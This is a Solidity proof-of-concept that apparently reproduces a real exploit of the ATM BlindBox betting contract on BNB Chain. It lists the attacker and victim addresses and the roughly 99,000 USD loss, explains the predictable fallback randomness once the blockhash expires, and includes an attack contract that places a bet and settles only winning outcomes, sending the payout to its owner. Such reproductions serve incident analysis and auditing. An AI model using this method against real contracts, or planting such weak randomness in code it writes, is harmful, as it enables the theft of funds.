// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

// @KeyInfo - Total Lost : 13,000,000 ATM (~99,000 USD)
// Attacker : 0x3f9Bd963641e969Fc0c9Ddf1c67e210e84915b7D
// Attack Contract : 0x9C1819640201f223596FaD4F6401900B4B732eeA
// Vulnerable Contract : 0x1F8336aEF584795E282FECe8DE356BaBD7734c59
// Victim : 0x1F8336aEF584795E282FECe8DE356BaBD7734c59
// Attack Tx : https://bscscan.com/tx/0xb74a572967ce997afa5920811e6a9dc8b82a6e41ee31fa4d1a24a85aec89e342

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x1F8336aEF584795E282FECe8DE356BaBD7734c59#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/2808
//
// ATM BlindBox let users choose when to settle a parity bet. The settlement seed
// is supposed to come from blockhash(betBlock + 2), a value unknowable to the
// bettor at entry time. Once that blockhash falls outside the EVM's 256-block
// retrieval window, `_trySettle` silently falls back to
// keccak256(block.prevrandao, betId, block.timestamp) — three inputs that are
// all readable by the caller in the very block they broadcast `settle`. There is
// no forced settlement deadline and `settle` is callable by anyone, so a bettor
// can leave a losing bet open for free and only broadcast `settle` once they have
// computed off-chain that the fallback seed resolves to a win.
//
// This harness replays the same structural bug without a real 820-block wait:
// the playground's in-browser EVM has no linked blockchain, so BLOCKHASH always
// resolves to zero anyway (the fallback branch always fires) and block.prevrandao
// is always zero. The one thing that harness cannot do is advance the chain
// between "place the bet" and "settle the bet", so this contract's owner (the
// harness config) rewrites the bet's own recorded entry block via a direct
// storage write between those two calls — mechanically equivalent to the real
// attacker waiting ~257+ blocks for blockhash(betBlock + 2) to expire, without
// requiring the harness to model hundreds of intermediate blocks.

address constant ATM_TOKEN = 0x9C86F45905868317baCB8f442653d5E9a6888888;
address constant BLINDBOX = 0x1F8336aEF584795E282FECe8DE356BaBD7734c59;
address constant DEAD = 0x000000000000000000000000000000000000dEaD;

interface IERC20Min {
    function balanceOf(
        address account
    ) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);
}

interface IBlindBox {
    function settle(
        uint256 betId
    ) external;
}

contract ATMBlindBox {
    address private immutable owner;
    IERC20Min private constant atm = IERC20Min(ATM_TOKEN);
    IBlindBox private constant blindBox = IBlindBox(BLINDBOX);

    constructor(
        address owner_
    ) {
        owner = owner_;
    }

    /// @notice Step 1 (unrecorded setup): burn ATM to the dEaD payout pool. The
    /// ATM token's transfer hook detects the dEaD destination and forwards
    /// (from, amount, syntheticReserveATM, twapPrice) into
    /// BlindBox.onBlindBoxEntry, which records an open bet keyed on the last
    /// 0.1-ATM digit of `amount` (even/odd) and the current block number.
    function placeLargeBet(
        uint256 amount
    ) external {
        require(msg.sender == owner, "only owner");
        atm.transfer(DEAD, amount);
    }

    /// @notice Step 2 (RECORDED): settle the now-"expired" bet and sweep the
    /// winnings to the attacker. In the real attack the attacker waited until
    /// blockhash(betBlock + 2) expired, computed the fallback seed
    /// (prevrandao, betId, timestamp) off-chain, and broadcast `settle` only
    /// because it was already a guaranteed win — `settle` itself is
    /// permissionless and unconditional, so anyone (including this contract)
    /// can trigger the payout once the fallback branch is live.
    function settleAndWithdraw(
        uint256 betId
    ) external {
        require(msg.sender == owner, "only owner");
        blindBox.settle(betId);
        atm.transfer(owner, atm.balanceOf(address(this)));
    }
}
